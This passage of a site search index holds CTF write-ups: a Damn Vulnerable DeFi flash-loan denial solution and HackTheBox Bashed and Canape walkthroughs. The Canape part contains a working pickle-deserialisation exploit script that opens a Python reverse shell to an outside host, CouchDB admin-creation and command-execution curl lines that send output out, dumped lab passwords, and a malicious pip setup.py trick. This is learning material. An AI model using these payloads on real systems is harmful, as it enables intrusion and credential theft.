revert, stopping the pool from giving flash loans. Exploit I modified the unstoppable.challenge.js with: it('Exploit', async function () { await this.token.connect(attacker).transfer(this.pool.address, 1) }); Fix As part of my learning phase of Smart Contracts Security, I like to think how I could solve this issue. However, in this particular case I think that the poolBalance variable is useless in this context. I'd remove it and therefore remove the check in line 7th.","title":"Unstoppable"},{"location":"DeFi/damn-vulnerable-defi/unstoppable/#unstoppable","text":"","title":"Unstoppable"},{"location":"DeFi/damn-vulnerable-defi/unstoppable/#statement","text":"There's a lending pool with a million DVT tokens in balance, offering flash loans for free. If only there was a way to attack and stop the pool from offering flash loans ... You start with 100 DVT tokens in balance.","title":"Statement"},{"location":"DeFi/damn-vulnerable-defi/unstoppable/#analysis","text":"According to the statement our mission is to try to stop the pool for offering flash loans. No need to extract money, empty an account or anything else. Just, freeze the contract.","title":"Analysis"},{"location":"DeFi/damn-vulnerable-defi/unstoppable/#understanding-contracts","text":"There are two contracts: UnstoppableLender.sol : Contract which implements the logic of the lending flash loans. ReceiverUnstoppable.sol : Contract which implements the logic of receiving funds from the lending pool. Let's first analyze the lending pool contract: This contract implements a pool of ERC20 tokens (damnValuableToken). In fact, the address of the underlying token is provided in the constructor. It has two interesting functions: depositTokens : Function that implements the deposit of tokens into the pool. Updating some internal variables. flashLoan : Function that implements the lending logic. 1. function depositTokens(uint256 amount) external nonReentrant { 2. require(amount > 0, \"Must deposit at least one token\"); 3. // Transfer token from sender. Sender must have first approved them. 4. damnValuableToken.transferFrom(msg.sender, address(this), amount); 5. poolBalance = poolBalance + amount; 6. } Some comments about this function: It first checks that the amount of damnValuableToken (ERC20 token) to be deposited is greater than 0. It performs a transfer from the address calling this function (the wallet doing the deposit) to the current pool. In order to be able to execute such functionality, the wallet should've already provided with permissions to do that (allowance) It stores and updates an internal variable poolBalance which holds the current amount of tokens that the pool has. Now, let's move on to the following function: 0. function flashLoan(uint256 borrowAmount) external nonReentrant { 1. require(borrowAmount > 0, \"Must borrow at least one token\"); 2. 3. uint256 balanceBefore = damnValuableToken.balanceOf(address(this)); 4. require(balanceBefore >= borrowAmount, \"Not enough tokens in pool\"); 5. 6. // Ensured by the protocol via the `depositTokens` function 7. assert(poolBalance == balanceBefore); 8. 9. damnValuableToken.transfer(msg.sender, borrowAmount); 10. 11. IReceiver(msg.sender).receiveTokens(address(damnValuableToken), borrowAmount); 12. 13. uint256 balanceAfter = damnValuableToken.balanceOf(address(this)); 14. require(balanceAfter >= balanceBefore, \"Flash loan hasn't been paid back\"); 18. } Some notes about this code snippet: It has the nonReentrant modifier. So, no reentrancy possible. In the first three lines, it basically checks that the borrowed amount provided as a parameter is valid. In order to do so, it checks if it\u2019s greater than zero and that it doesn't exceed the amount of tokens the lending pool has. If it does exceed, it reverts. The 7th line is a bit controversial and weird. It checks that the amount of damnValuableTokens that the pool currently has is the same as the internal variable that is updated in the depositTokens() function. Why is this carried out? Why would someone try to store the actual balance if this information is already stored in the ERC20 token contract? Remember that calls to that function are free because they are reading the blockchain and not writing anything. Line 11 calls the receiveToken() function from the ReceiverUnstoppable contract. This is where the borrower would implement the logic to leverage the loan received. Line 13-14 basically ensures that the loan has been repaid (with fees).","title":"Understanding contracts"},{"location":"DeFi/damn-vulnerable-defi/unstoppable/#final-solution","text":"According to the exercise statement we had to find a way to stop the pool offering loans. Line 7th seems very controversial as it is comparing two values that should be always the same but they are managed in different ways. If it was only possible to change one of them in order to desync them... Well.. in fact it is actually possible. The depositTokens() is adding the deposited value to the internal value each time this function is called. On the other side, the ERC20 balanceOf() function, checks the amount of tokens that the address has according to the ERC20 contract. So.. is the depositTokens() the only way to deposit/send damnValuableToken tokens in this pool? Clearly, no. What somebody could do is just to send 1 damnValuableToken to this pool address and this will make \"update\" the balance of the pool's damnValuableTokens but the poolBalance will remain the same. By desyncing these two variables, line 7th will always fail and therefore this function will always revert, stopping the pool from giving flash loans.","title":"Final solution"},{"location":"DeFi/damn-vulnerable-defi/unstoppable/#exploit","text":"I modified the unstoppable.challenge.js with: it('Exploit', async function () { await this.token.connect(attacker).transfer(this.pool.address, 1) });","title":"Exploit"},{"location":"DeFi/damn-vulnerable-defi/unstoppable/#fix","text":"As part of my learning phase of Smart Contracts Security, I like to think how I could solve this issue. However, in this particular case I think that the poolBalance variable is useless in this context. I'd remove it and therefore remove the check in line 7th.","title":"Fix"},{"location":"arduino/robot/","text":"Coming Soon..","title":"Robot"},{"location":"arduino/robot/#coming-soon","text":"","title":"Coming Soon.."},{"location":"ctfs/hackthebox/bashed/","text":"Bashed User This machine was pretty easy. First of all I used dirb to start listing some common directories. dirb http://10.10.10.68 common.txt Some directories were found: The dev seemed to be the most interesting one, therefore I started from there: And once inside phpbash.php : Root TBD","title":"Bashed"},{"location":"ctfs/hackthebox/bashed/#bashed","text":"","title":"Bashed"},{"location":"ctfs/hackthebox/bashed/#user","text":"This machine was pretty easy. First of all I used dirb to start listing some common directories. dirb http://10.10.10.68 common.txt Some directories were found: The dev seemed to be the most interesting one, therefore I started from there: And once inside phpbash.php :","title":"User"},{"location":"ctfs/hackthebox/bashed/#root","text":"TBD","title":"Root"},{"location":"ctfs/hackthebox/canape/","text":"Canape User This was my favorite machine so far. Thanks: @overcast!. So, as always, lets start with nmap: $> nmap -sC -sV 10.10.10.70 > nmap And here is the output: Great, while we go to the HTTP server, I'll let an nmap full scan running.. Once we connect to the HTTP server we find some stuff related with The Simpsons, nothing interesting yet.. Looking to the source code of the main page, we find this: Ok.. Seems not to be too relevant right now, but .. maybe it's useful later on. I continued digging in across the web site, trying to submit some quote with malicious content, but without luck. Then, I realized that the nmap has discovered a .git directory, so I proceed to download it: $> wget --recursive --no-parent http://10.10.10.70/.git/ Once I get into the directory, I listed all the logs and figured it out that one of the hashes of the commits, was the same as the one in the source code of the web page. At that moment, I thought that this hash was telling us the current version of the running application. I listed all the files of the initial commit, and then add the updates that the commit made, and extract a code of a Flask application. Just in a few words, this application had to main entrypoints: submit : Where you can submit your quote, and it will stored using Pickle . check : Where it will load the content of your quote as a Pickle and show it back to you. I searched for some tutorials of how to exploit this and fortunately I found a couple of them. So, time to develop our own exploit. My next step, was to copy the code locally, remove the things that where not important for us (connection to DB, rendering of templates, etc) and start testing it. After some time, I had my exploit working locally, so I went to test it remotely. Unfortunately, I didn't work at all, and I didn't have any clue why it wasn't working. I started to go back on my steps, and figured it out something crucial. The submit endpoint was saving the content of the submitted quote in a temporary file. The name of this file was the result of getting the 10 first chars of the encoding in base64 of concatneation between the character & quote content: ... p_id = base64.b64encode(char + quote)[:10] ... Or.. at least, that was why I thought... When I went back on my steps, I figured the commits after the one we analyzed, some changes on the code were made.. In particular there was one, that changed the way of defining the file name.. They changed from the base64 encoding of the first 10 chars to the md5 hash of the concatenation: git show 524f9ddcc74e10aba7256f91263c935c6dfb41e1 - p_id = base64.b64encode(char + quote)[:10] + p_id = md5(char + quote).hexdigest() So I decided to get the last version of the application (by analyzing the changes of each commit) and develop again the exploit. This was final version of the python application: import string import random import base64 import cPickle from flask import Flask, render_template, request from hashlib import md5 app = Flask(__name__) @app.errorhandler(404) def page_not_found(e): if random.randrange(0, 2) > 0: return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(random.randrange(50, 250))) else: return render_template(\"index.html\") @app.route(\"/\") def index(): return render_template(\"index.html\") @app.route(\"/quotes\") def quotes(): quotes = [] for id in db: quotes.append({\"title\": db[id][\"character\"], \"text\": db[id][\"quote\"]}) return render_template('quotes.html', entries=quotes) WHITELIST = [ \"homer\", \"marge\", \"bart\", \"lisa\", \"maggie\", \"moe\", \"carl\", \"krusty\" ] @app.route(\"/submit\", methods=[\"GET\", \"POST\"]) def submit(): error = None success = None if request.method == \"POST\": try: char = request.form[\"character\"] quote = request.form[\"quote\"] print \"Char: {}]\\nQuote:{}\".format(char,quote) if not char or not quote: error = True elif not any(c.lower() in char.lower() for c in WHITELIST): error = True else: # TODO - Pickle into dictionary instead, `check` is ready #p_id = base64.b64encode(char + quote)[:10] p_id = md5(char + quote).hexdigest() outfile = open(\"/tmp/\" + p_id + \".p\", \"wb\") outfile.write(char + quote) outfile.close() success = True except Exception as ex: error = True if error: return \"<html><p1>error</p1></html>\" else: return \"<html><p1>success</p1></html>\" #return \"render_template(\"submit.html\", error=error, success=success) @app.route(\"/check\", methods=[\"POST\"]) def check(): print request.form[\"id\"] path = \"/tmp/\" + request.form[\"id\"] + \".p\" data = open(path, \"rb\").read() if \"p1\" in data: item = cPickle.loads(data) else: item = data print item return \"Still reviewing: \" + item if __name__ == \"__main__\": app.run(host=\"0.0.0.0\") (it may be a little modified, but the core parts are there.) So with this version running locally, I continued developing my exploit to get a reverse shell, and after a couple of minutes, I achieved this: import requests #import base64 from hashlib import md5 PATH_REMOTE = \"http://10.10.10.70/{}\" PATH_LOCAL = \"http://192.168.0.15:5000/{}\" REMOTE = True def submit_exploit(cmd): action = 'submit' char = \"S'homer'\\np1\\ncos\\nsystem\\n(S'{cmd}'\\ntRS'marge'\\np1\\n\".format(cmd=cmd) quote = '.' payload = \"character={char}&quote={quote}\".format(char=char,quote=quote) headers = {'Content-type': 'application/x-www-form-urlencoded'} path = PATH_REMOTE.format(action) if REMOTE else PATH_LOCAL.format(action) print payload r = requests.post(path, data=payload, headers=headers) if r.status_code == 200 and (\"thank you for your suggestion\" in r.text.lower() or 'success' in r.text.lower()): print \"[+] Payload successfully sent. Command: {cmd}\".format(cmd=cmd) #return base64.encodestring(char+quote)[:10] return md5(char+quote).hexdigest() else: print \"[-] Error sending payload\" raise Exception(\"Error sending payload: \\n\\tHttp code returned: {http_code}. \\n\\t response body:\\n {body}\".format(http_code= r.status_code, body=r.text)) def check_and_run_exploit(id_code): action = 'check' headers = {'Content-type': 'application/x-www-form-urlencoded'} payload = \"id={id_code}\".format(id_code=id_code) path = PATH_REMOTE.format(action) if REMOTE else PATH_LOCAL.format(action) r = requests.post(path, data=payload, headers=headers) if r.status_code == 200: print \"[+] Exploit successfully executed\" return r.text else: print \"[-] Error executing exploit\" raise Exception(\"Error executing exploit: \\n\\tHttp code returned: {http_code}. \\n\\t response body:\\n {body}\".format(http_code= r.status_code, body=r.text)) if __name__ == \"__main__\": cmd = \"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"10.10.14.255\\\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);'\" id_code = submit_exploit(cmd) check_and_run_exploit(id_code) Two disclaimers: The first and last part of the payload have two strings Homer and Marge. The first one is to bypass the whitelist filtering that app has regarding the name of the character. The last one is to avoid the application to trigger and error when concatenating the result of the Pickle.load() to a string (otherwise it will try to concatenate a number (the error code of the executed command) and a string, and it will fail). The REMOTE variable is just something custom made to quickly switch between the Remote server and my local one. After launching the exploit, we get a reverse shell in the port 4444. Once we got the reverse shell, we upgraded to tty (see ippsec video) in order to have more features (history, auto-completition, etc). Although, we have a reverse shell, the user running the HTTP server is www-data , so we need to escalate privileges and log in as other user. Once inside the machine, my first move was to run LinEnum.sh . Once of the outputs of it was the following: I spent hours, trying to understand this file. Until I gave up (hopefully I did it) and continue looking in another place. I guess it was a BIG troll. Analyzing the applications running on the system and its ports, I found the couchdb running in localhost. I started reading a little bit about this DB (never saw it before), and quickly figure it out how to connect to it: $> curl -X GET http://localhost:5984 {\"couchdb\":\"Welcome\",\"version\":\"2.0.0\",\"vendor\":{\"name\":\"The Apache Software Foundation\"}} I started playing around a little more and figured it out how to list dbs and docs inside them: $> curl -X GET http://localhost:5984/_all_dbs [\"_global_changes\",\"_metadata\",\"_replicator\",\"_users\",\"passwords\",\"simpsons\"] $> curl -X GET http://localhost:5984/simpsons/_all_docs {\"total_rows\":7,\"offset\":0,\"rows\":[ {\"id\":\"f0042ac3dc4951b51f056467a1000dd9\",\"key\":\"f0042ac3dc4951b51f056467a1000dd9\",\"value\":{\"rev\":\"1-fbdd816a5b0db0f30cf1fc38e1a37329\"}}, {\"id\":\"f53679a526a868d44172c83a61000d86\",\"key\":\"f53679a526a868d44172c83a61000d86\",\"value\":{\"rev\":\"1-7b8ec9e1c3e29b2a826e3d14ea122f6e\"}}, {\"id\":\"f53679a526a868d44172c83a6100183d\",\"key\":\"f53679a526a868d44172c83a6100183d\",\"value\":{\"rev\":\"1-e522ebc6aca87013a89dd4b37b762bd3\"}}, {\"id\":\"f53679a526a868d44172c83a61002980\",\"key\":\"f53679a526a868d44172c83a61002980\",\"value\":{\"rev\":\"1-3bec18e3b8b2c41797ea9d61a01c7cdc\"}}, {\"id\":\"f53679a526a868d44172c83a61003068\",\"key\":\"f53679a526a868d44172c83a61003068\",\"value\":{\"rev\":\"1-3d2f7da6bd52442e4598f25cc2e84540\"}}, {\"id\":\"f53679a526a868d44172c83a61003a2a\",\"key\":\"f53679a526a868d44172c83a61003a2a\",\"value\":{\"rev\":\"1-4446bfc0826ed3d81c9115e450844fb4\"}}, {\"id\":\"f53679a526a868d44172c83a6100451b\",\"key\":\"f53679a526a868d44172c83a6100451b\",\"value\":{\"rev\":\"1-3f6141f3aba11da1d65ff0c13fe6fd39\"}} $> curl -X GET http://localhost:5984/passwords/_all_docs {\"error\":\"unauthorized\",\"reason\":\"You are not a server admin.\"} So the job now seems to be getting server admin. After a google search looking for vulnerabilties affecting this DB in this version, I found this EXCELENT blogpost . Basically the attack consist in creating a server admin without any credentials only by sending an HTTP request (for further details, read the blog). I changed (just the names) a little bit the PoC of the blog and executed against the db: $> curl -X PUT 'http://localhost:5984/_users/org.couchdb.user:oops' --data-binary '{ \"type\": \"user\", \"name\": \"tsuller\", \"roles\": [\"_admin\"], \"roles\": [], \"password\": \"tsuller\" }' {\"ok\":true,\"id\":\"org.couchdb.user:tsuller\",\"rev\":\"1-0b547bb36cb610ec21d9571312f6e20c\"} Yes! Seems that it worked! Lets check: $> curl -X GET http://tsuller:tsuller@localhost:5984/_passwords/_all_docs {\"total_rows\":4,\"offset\":0,\"rows\":[ {\"id\":\"739c5ebdf3f7a001bebb8fc4380019e4\",\"key\":\"739c5ebdf3f7a001bebb8fc4380019e4\",\"value\":{\"rev\":\"2-81cf17b971d9229c54be92eeee723296\"}}, {\"id\":\"739c5ebdf3f7a001bebb8fc43800368d\",\"key\":\"739c5ebdf3f7a001bebb8fc43800368d\",\"value\":{\"rev\":\"2-43f8db6aa3b51643c9a0e21cacd92c6e\"}}, {\"id\":\"739c5ebdf3f7a001bebb8fc438003e5f\",\"key\":\"739c5ebdf3f7a001bebb8fc438003e5f\",\"value\":{\"rev\":\"1-77cd0af093b96943ecb42c2e5358fe61\"}}, {\"id\":\"739c5ebdf3f7a001bebb8fc438004738\",\"key\":\"739c5ebdf3f7a001bebb8fc438004738\",\"value\":{\"rev\":\"1-49a20010e64044ee7571b8c1b902cf8c\"}} ]} YES! Worked. Lets dump the content of each doc: $> curl http://tsuller:tsuller@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc4380019e4 {\"_id\":\"739c5ebdf3f7a001bebb8fc4380019e4\",\"_rev\":\"2-81cf17b971d9229c54be92eeee723296\",\"item\":\"ssh\",\"password\":\"0B4jyA0xtytZi7esBNGp\",\"user\":\"\"} $> curl http://tsuller:tsuller@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc43800368d {\"_id\":\"739c5ebdf3f7a001bebb8fc43800368d\",\"_rev\":\"2-43f8db6aa3b51643c9a0e21cacd92c6e\",\"item\":\"couchdb\",\"password\":\"r3lax0Nth3C0UCH\",\"user\":\"couchy\"} $> curl http://tsuller:tsuller@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc438003e5f {\"_id\":\"739c5ebdf3f7a001bebb8fc438003e5f\",\"_rev\":\"1-77cd0af093b96943ecb42c2e5358fe61\",\"item\":\"simpsonsfanclub.com\",\"password\":\"h02ddjdj2k2k2\",\"user\":\"homer\"} $> curl http://tsuller:tsuller@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc438004738 {\"_id\":\"739c5ebdf3f7a001bebb8fc438004738\",\"_rev\":\"1-49a20010e64044ee7571b8c1b902cf8c\",\"user\":\"homerj0121\",\"item\":\"github\",\"password\":\"STOP STORING YOUR PASSWORDS HERE -Admin\"} If we pay atenttion to the home directory, we'll just find homer user. So my next step was to try to login with this user using some of this credentials. Fortunately, the first one (the ssh one) worked, and seconds later I was able to get the user flag: Root To start, I ran again the LinEnum.sh but this time tried to pay a little more of attention to the output, but... it was worthless. Nothing point me to the right direction. In some moment, I thought that the couchdb was running as root . I decided to look for some public exploit. Fortunately, I found one that allowed you to execute commands if you were a system admin. Not only we had the user created by us, but also couchy (look the docs of the password db) was admin. Thanks to this blogpost first, and a little help from this also I was able to successfully execute commands: curl -X PUT 'http://couchy:r3lax0Nth3C0UCH@localhost:5986/_config/query_servers/cmd' -d '\"whoami | curl http://10.10.14.255:5555 -d @-\"' --insecure curl -X PUT 'http://couchy:r3lax0Nth3C0UCH@localhost:5986/testing' --insecure curl -X PUT 'http://couchy:r3lax0Nth3C0UCH@localhost:5986/testing/blah' -d '{\"_id\":\"770855a97726d5666d70a22173005c77\"}' --insecure curl -X POST 'http://couchy:r3lax0Nth3C0UCH@localhost:5986/testing/_temp_view?limit=11' -d '{\"language\":\"cmd\",\"map\":\"\"}' -H 'Content-Type: application/json' --insecure Unfortunately, when I went to my shell where I was hosting the NC in port 5555, the news were bad. The answer of the whoami wasn't root but homer. I must have confused with some other running process. I continued looking for some interesting thing, but nothing showed up. During that search, I issued: sudo -l And this was the output: ![sudoers][./images/canape/sudoers.png] For those not very familiar, this means that the user homer can run as root the command pip install without providing a password (this comes from the configuration of the /etc/sudoers file). How can we abuse this? PIP is a python packet manager. It allows not only to write down the package you want (and if it's in the pipy repository download it) but also it allows you to install packages providing the source file directly. Usually, python packages have a very particular file called setup.py which is the one in charge of really installing the package in your enviroment (virtual env or general env). So my idea was to, download a compressed version of package that already exists (I pick request because is my favourite lib), modify it's code, compress it again and try to install it using sudo: Downloaded the source code from here . Decompressed it. Added the following line to the setup.py: os.system('cat /root/root.txt > /tmp/4877df3bb9dfe713a404dd8d6e4e94cc.p') (I used that name just to try not to spoil to anybody the flag due to in /tmp there are all the submitted quotes) * Compressed it again. * Served it in a python serve so you can copy it to the machine . * Executed: sudo /usr/bin/pip install blablabla.tar.gz Read the flag from /tmp/4877df3bb9dfe713a404dd8d6e4e94cc.p Modify again the previous setup.py again, this time to delete the flag file and don't spoil to anyone =D.","title":"Canape (favourite)"},{"location":"ctfs/hackthebox/canape/#canape","text":"","title":"Canape"},{"location":"ctfs/hackthebox/canape/#user","text":"This was my favorite machine so far. Thanks: @overcast!. So, as always, lets start with nmap: $> nmap -sC -sV 10.10.10.70 > nmap And here is the output: Great, while we go to the HTTP server, I'll let an nmap full scan running.. Once we connect to the HTTP server we find some stuff related with The Simpsons, nothing interesting yet.. Looking to the source code of the main page, we find this: Ok.. Seems not to be too relevant right now, but .. maybe it's useful later on. I continued digging in across the web site, trying to submit some quote with malicious content, but without luck. Then, I realized that the nmap has discovered a .git directory, so I proceed to download it: $> wget --recursive --no-parent http://10.10.10.70/.git/ Once I get into the directory, I listed all the logs and figured it out that one of the hashes of the commits, was the same as the one in the source code of the web page. At that moment, I thought that this hash was telling us the current version of the running application. I listed all the files of the initial commit, and then add the updates that the commit made, and extract a code of a Flask application. Just in a few words, this application had to main entrypoints: submit : Where you can submit your quote, and it will stored using Pickle . check : Where it will load the content of your quote as a Pickle and show it back to you. I searched for some tutorials of how to exploit this and fortunately I found a couple of them. So, time to develop our own exploit. My next step, was to copy the code locally, remove the things that where not important for us (connection to DB, rendering of templates, etc) and start testing it. After some time, I had my exploit working locally, so I went to test it remotely. Unfortunately, I didn't work at all, and I didn't have any clue why it wasn't working. I started to go back on my steps, and figured it out something crucial. The submit endpoint was saving the content of the submitted quote in a temporary file. The name of this file was the result of getting the 10 first chars of the encoding in base64 of concatneation between the character & quote content: ... p_id = base64.b64encode(char + quote)[:10] ... Or.. at least, that was why I thought... When I went back on my steps, I figured the commits after the one we analyzed, some changes on the code were made.. In particular there was one, that changed the way of defining the file name.. They changed from the base64 encoding of the first 10 chars to the md5 hash of the concatenation: git show 524f9ddcc74e10aba7256f91263c935c6dfb41e1 - p_id = base64.b64encode(char + quote)[:10] + p_id = md5(char + quote).hexdigest() So I decided to get the last version of the application (by analyzing the changes of each commit) and develop again the exploit. This was final version of the python application: import string import random import base64 import cPickle from flask import Flask, render_template, request from hashlib import md5 app = Flask(__name__) @app.errorhandler(404) def page_not_found(e): if random.randrange(0, 2) > 0: return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(random.randrange(50, 250))) else: return render_template(\"index.html\") @app.route(\"/\") def index(): return render_template(\"index.html\") @app.route(\"/quotes\") def quotes(): quotes = [] for id in db: quotes.append({\"title\": db[id][\"character\"], \"text\": db[id][\"quote\"]}) return render_template('quotes.html', entries=quotes) WHITELIST = [ \"homer\", \"marge\", \"bart\", \"lisa\", \"maggie\", \"moe\", \"carl\", \"krusty\" ] @app.route(\"/submit\", methods=[\"GET\", \"POST\"]) def submit(): error = None success = None if request.method == \"POST\": try: char = request.form[\"character\"] quote = request.form[\"quote\"] print \"Char: {}]\\nQuote:{}\".format(char,quote) if not char or not quote: error = True elif not any(c.lower() in char.lower() for c in WHITELIST): error = True else: # TODO - Pickle into dictionary instead, `check` is ready #p_id = base64.b64encode(char + quote)[:10] p_id = md5(char + quote).hexdigest() outfile = open(\"/tmp/\" + p_id + \".p\", \"wb\") outfile.write(char + quote) outfile.close() success = True except Exception as ex: error = True if error: return \"<html><p1>error</p1></html>\" else: return \"<html><p1>success</p1></html>\" #return \"render_template(\"submit.html\", error=error, success=success) @app.route(\"/check\", methods=[\"POST\"]) def check(): print request.form[\"id\"] path = \"/tmp/\" + request.form[\"id\"] + \".p\" data = open(path, \"rb\").read() if \"p1\" in data: item = cPickle.loads(data) else: item = data print item return \"Still reviewing: \" + item if __name__ == \"__main__\": app.run(host=\"0.0.0.0\") (it may be a little modified, but the core parts are there.) So with this version running locally, I continued developing my exploit to get a reverse shell, and after a couple of minutes, I achieved this: import requests #import base64 from hashlib import md5 PATH_REMOTE = \"http://10.10.10.70/{}\" PATH_LOCAL = \"http://192.168.0.15:5000/{}\" REMOTE = True def submit_exploit(cmd): action = 'submit' char = \"S'homer'\\np1\\ncos\\nsystem\\n(S'{cmd}'\\ntRS'marge'\\np1\\n\".format(cmd=cmd) quote = '.' payload = \"character={char}&quote={quote}\".format(char=char,quote=quote) headers = {'Content-type': 'application/x-www-form-urlencoded'} path = PATH_REMOTE.format(action) if REMOTE else PATH_LOCAL.format(action) print payload r = requests.post(path, data=payload, headers=headers) if r.status_code == 200 and (\"thank you for your suggestion\" in r.text.lower() or 'success' in r.text.lower()): print \"[+] Payload successfully sent. Command: {cmd}\".format(cmd=cmd) #return base64.encodestring(char+quote)[:10] return md5(char+quote).hexdigest() else: print \"[-] Error sending payload\" raise Exception(\"Error sending payload: \\n\\tHttp code returned: {http_code}. \\n\\t response body:\\n {body}\".format(http_code= r.status_code, body=r.text)) def check_and_run_exploit(id_code): action = 'check' headers = {'Content-type': 'application/x-www-form-urlencoded'} payload = \"id={id_code}\".format(id_code=id_code) path = PATH_REMOTE.format(action) if REMOTE else PATH_LOCAL.format(action) r = requests.post(path, data=payload, headers=headers) if r.status_code == 200: print \"[+] Exploit successfully executed\" return r.text else: print \"[-] Error executing exploit\" raise Exception(\"Error executing exploit: \\n\\tHttp code returned: {http_code}. \\n\\t response body:\\n {body}\".format(http_code= r.status_code, body=r.text)) if __name__ == \"__main__\": cmd = \"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"10.10.14.255\\\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);'\" id_code = submit_exploit(cmd) check_and_run_exploit(id_code) Two disclaimers: The first and last part of the payload have two strings Homer and Marge. The first one is to bypass the whitelist filtering that app has regarding the name of the character. The last one is to avoid the application to trigger and error when concatenating the result of the Pickle.load() to a string (otherwise it will try to concatenate a number (the error code of the executed command) and a string, and it will fail). The REMOTE variable is just something custom made to quickly switch between the Remote server and my local one. After launching the exploit, we get a reverse shell in the port 4444. Once we got the reverse shell, we upgraded to tty (see ippsec video) in order to have more features (history, auto-completition, etc). Although, we have a reverse shell, the user running the HTTP server is www-data , so we need to escalate privileges and log in as other user. Once inside the machine, my first move was to run LinEnum.sh . Once of the outputs of it was the following: I spent hours, trying to understand this file. Until I gave up (hopefully I did it) and continue looking in another place. I guess it was a BIG troll. Analyzing the applications running on the system and its ports, I found the couchdb running in localhost. I started reading a little bit about this DB (never saw it before), and quickly figure it out how to connect to it: $> curl -X GET http://localhost:5984 {\"couchdb\":\"Welcome\",\"version\":\"2.0.0\",\"vendor\":{\"name\":\"The Apache Software Foundation\"}} I started playing around a little more and figured it out how to list dbs and docs inside them: $> curl -X GET http://localhost:5984/_all_dbs [\"_global_changes\",\"_metadata\",\"_replicator\",\"_users\",\"passwords\",\"simpsons\"] $> curl -X GET http://localhost:5984/simpsons/_all_docs {\"total_rows\":7,\"offset\":0,\"rows\":[ {\"id\":\"f0042ac3dc4951b51f056467a1000dd9\",\"key\":\"f0042ac3dc4951b51f056467a1000dd9\",\"value\":{\"rev\":\"1-fbdd816a5b0db0f30cf1fc38e1a37329\"}}, {\"id\":\"f53679a526a868d44172c83a61000d86\",\"key\":\"f53679a526a868d44172c83a61000d86\",\"value\":{\"rev\":\"1-7b8ec9e1c3e29b2a826e3d14ea122f6e\"}}, {\"id\":\"f53679a526a868d44172c83a6100183d\",\"key\":\"f53679a526a868d44172c83a6100183d\",\"value\":{\"rev\":\"1-e522ebc6aca87013a89dd4b37b762bd3\"}}, {\"id\":\"f53679a526a868d44172c83a61002980\",\"key\":\"f53679a526a868d44172c83a61002980\",\"value\":{\"rev\":\"1-3bec18e3b8b2c41797ea9d61a01c7cdc\"}}, {\"id\":\"f53679a526a868d44172c83a61003068\",\"key\":\"f53679a526a868d44172c83a61003068\",\"value\":{\"rev\":\"1-3d2f7da6bd52442e4598f25cc2e84540\"}}, {\"id\":\"f53679a526a868d44172c83a61003a2a\",\"key\":\"f53679a526a868d44172c83a61003a2a\",\"value\":{\"rev\":\"1-4446bfc0826ed3d81c9115e450844fb4\"}}, {\"id\":\"f53679a526a868d44172c83a6100451b\",\"key\":\"f53679a526a868d44172c83a6100451b\",\"value\":{\"rev\":\"1-3f6141f3aba11da1d65ff0c13fe6fd39\"}} $> curl -X GET http://localhost:5984/passwords/_all_docs {\"error\":\"unauthorized\",\"reason\":\"You are not a server admin.\"} So the job now seems to be getting server admin. After a google search looking for vulnerabilties affecting this DB in this version, I found this EXCELENT blogpost . Basically the attack consist in creating a server admin without any credentials only by sending an HTTP request (for further details, read the blog). I changed (just the names) a little bit the PoC of the blog and executed against the db: $> curl -X PUT 'http://localhost:5984/_users/org.couchdb.user:oops' --data-binary '{ \"type\": \"user\", \"name\": \"tsuller\", \"roles\": [\"_admin\"], \"roles\": [], \"password\": \"tsuller\" }' {\"ok\":true,\"id\":\"org.couchdb.user:tsuller\",\"rev\":\"1-0b547bb36cb610ec21d9571312f6e20c\"} Yes! Seems that it worked! Lets check: $> curl -X GET http://tsuller:tsuller@localhost:5984/_passwords/_all_docs {\"total_rows\":4,\"offset\":0,\"rows\":[ {\"id\":\"739c5ebdf3f7a001bebb8fc4380019e4\",\"key\":\"739c5ebdf3f7a001bebb8fc4380019e4\",\"value\":{\"rev\":\"2-81cf17b971d9229c54be92eeee723296\"}}, {\"id\":\"739c5ebdf3f7a001bebb8fc43800368d\",\"key\":\"739c5ebdf3f7a001bebb8fc43800368d\",\"value\":{\"rev\":\"2-43f8db6aa3b51643c9a0e21cacd92c6e\"}}, {\"id\":\"739c5ebdf3f7a001bebb8fc438003e5f\",\"key\":\"739c5ebdf3f7a001bebb8fc438003e5f\",\"value\":{\"rev\":\"1-77cd0af093b96943ecb42c2e5358fe61\"}}, {\"id\":\"739c5ebdf3f7a001bebb8fc438004738\",\"key\":\"739c5ebdf3f7a001bebb8fc438004738\",\"value\":{\"rev\":\"1-49a20010e64044ee7571b8c1b902cf8c\"}} ]} YES! Worked. Lets dump the content of each doc: $> curl http://tsuller:tsuller@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc4380019e4 {\"_id\":\"739c5ebdf3f7a001bebb8fc4380019e4\",\"_rev\":\"2-81cf17b971d9229c54be92eeee723296\",\"item\":\"ssh\",\"password\":\"0B4jyA0xtytZi7esBNGp\",\"user\":\"\"} $> curl http://tsuller:tsuller@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc43800368d {\"_id\":\"739c5ebdf3f7a001bebb8fc43800368d\",\"_rev\":\"2-43f8db6aa3b51643c9a0e21cacd92c6e\",\"item\":\"couchdb\",\"password\":\"r3lax0Nth3C0UCH\",\"user\":\"couchy\"} $> curl http://tsuller:tsuller@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc438003e5f {\"_id\":\"739c5ebdf3f7a001bebb8fc438003e5f\",\"_rev\":\"1-77cd0af093b96943ecb42c2e5358fe61\",\"item\":\"simpsonsfanclub.com\",\"password\":\"h02ddjdj2k2k2\",\"user\":\"homer\"} $> curl http://tsuller:tsuller@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc438004738 {\"_id\":\"739c5ebdf3f7a001bebb8fc438004738\",\"_rev\":\"1-49a20010e64044ee7571b8c1b902cf8c\",\"user\":\"homerj0121\",\"item\":\"github\",\"password\":\"STOP STORING YOUR PASSWORDS 